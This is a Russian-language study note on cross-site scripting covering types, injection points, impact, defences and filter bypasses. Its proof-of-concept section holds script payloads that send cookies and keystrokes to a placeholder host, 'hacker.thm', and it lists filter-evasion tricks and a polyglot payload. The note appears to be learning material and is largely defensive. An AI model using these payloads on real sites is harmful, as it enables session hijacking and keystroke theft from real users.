### **XSS(client/server)**

* **Описание**
XSS, или Cross-Site Scripting, — межсайтовый скриптинг. Уязвимость, при которой злоумышленник внедряет вредоносный код в веб-приложение. Код выполняется в браузере пользователя и совершает злонамеренные действия.

Клиентская уязвимость. Возникает, когда данные пользователя попадают на веб-страницу без должной проверки и экранирования — например, строка поиска, никнейм, параметры запроса. Это позволяет злоумышленнику внедрить вредоносный JavaScript-код, который выполнится в браузере пользователя.

Stored XSS — сохранённый XSS. Уязвимость, при которой подконтрольные пользователю данные сохраняются на сервере и позже появляются на веб-страницах.

* **Виды**
* Отраженный XSS(Reflected) - Отраженный XSS происходит, когда данные, предоставленные пользователем в HTTP-запросе, включаются в источник веб-страницы без какой-либо проверки.
    Параметры запроса — search.
    Заголовки запроса
    Название прикрепляемых файлов.
    Содержимое прикрепляемых файлов, если оно попадает на страницу.
    Параметры в строке запроса URL-адреса
    URL-путь к файлу
    Иногда HTTP-заголовки (хотя на практике это маловероятно)

* Сохраненный XSS(Stored) - Как следует из названия, полезные данные XSS хранятся в веб-приложении (например, в базе данных), а затем запускаются, когда другие пользователи посещают сайт или веб-страницу.
    Комментарии в блоге
    Информация профиля пользователя
    Списки веб-сайтов
    Ф. И. О., никнейм, место жительства, город, страна;
    информация о себе, статус в соцсети;
    сообщения в чате, комментарий к блогу, отзыв на товары и услуги.

* DOM XSS(DOM)

* Слепой XSS(Blind)

* **Точки входа**
    Между HTML-тегами: <title>any_code; YOUR_DATA; any_code</title>.
    В HTML-атрибутах: <a any_attribute="any_data YOUR_DATA"></a>.
    Между JavaScript-тегами: <script>any_code; YOUR_DATA; any_code</script>.
    Внутри JavaScript-строки: <script>a = "some"; b="some1 YOUR_DATA"</script>.
    Параметры запроса — search.
    Заголовки запроса
    Название прикрепляемых файлов.
    Содержимое прикрепляемых файлов, если оно попадает на страницу.

* **POC**
<script>alert('XSS');</script>
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );</script>

* **Профит**
- Выполнить любое действие в приложении, которое может выполнять пользователь.
- Просмотреть любую информацию, к которой у пользователя есть доступ.
- Изменить любую информацию, которую пользователь может изменять.
- Взаимодействовать с другими пользователями приложения, включая вредоносные атаки. Причём атаки будут выглядеть так, как будто их выполняет пользователь-жертва.
- Украсть авторизационные данные пользователя, такие как куки-файлы или JWT-токены, а затем успешно захватить аккаунт жертвы.

* **Защита**
*	 Санитизация — удаление небезопасных символов из пользовательского ввода.
*        Энкодинг — процесс преобразования данных из одного формата в другой.
*        Белый список — список разрешённых для ввода тегов и атрибутов.
*        Валидация — оценка данных пользовательского ввода на соответствие контексту.

*	Защита от DOM XSS. 
Trusted Types - Trusted Types — директива, разработанная командой Google Chrome для предотвращения XSS-уязвимостей. Это API, которое следит за типом данных в HTML-разметке и сценариях веб-страниц. Она помогает разработчикам контролировать, откуда и как данные могут попасть в веб-страницу. 
Sanitizer API — решение от Mozilla. Однако оно доступно только в браузерах Google Chrome и Mozilla Firefox. 

*	Методы митигации последствий XSS

Для защиты пользователя используется комплекс мер, который называется митигацией. 
Митигация — действия, направленные на смягчение последствий уязвимости, то есть снижение уровня опасности.
Например, если установить параметр HttpOnly для куки-файлов, то злоумышленник не сможет получить доступ к куки из JavaScript. Доступ хакера к JavaScript — это признак XSS-атаки. Однако хакер не получит куки пользователя — их там нет. 

[Для митигации XSS-атак разработчики настраивают:]

*    Параметры куки.
*    Security Headers — HTTP-заголовки безопасности .
*    Content Security Policy — политику безопасности контента.

*    Использовать экранирование, валидацию и санитизацию пользовательского ввода как на серверной, так и на клиентской части. Лучше использовать популярные библиотеки, например DOMPurify.
*    Использовать Content Security Policy — CSP.
*    Не использовать устаревшие или уязвимые к XSS библиотеки и фреймворки.
*    Не использовать небезопасные функции совместно с необработанным пользовательским вводом, такие как eval(), document.write() и другие.
*    Использовать современные фреймворки со встроенной защитой от XSS, такие как React, Vue.js, и Spring. В них безопасность реализована по умолчанию.
    
Более подробно в файле XSS!!!

* **Обход защиты**

* Методы обхода защиты от внедрения Reflected XSS 

    Дублирование тегов — <script><script> или <scr<script>ipt>.
    Использование строчных и прописных букв в нагрузке — <ScRIpt>alert(1)</SCRIPt>.
    Использование   вместо ( ) — <script>alert1</script>.
    Использование различных кодировок нагрузки — Unicode, HTML, URL, Base64, HEX.
    Использование двойного кодирования нагрузки — вместо %3Cscript%3Ealert%281%29%3C%2Fscript%3E используется %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E.
    Использование Polyglot — javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>.


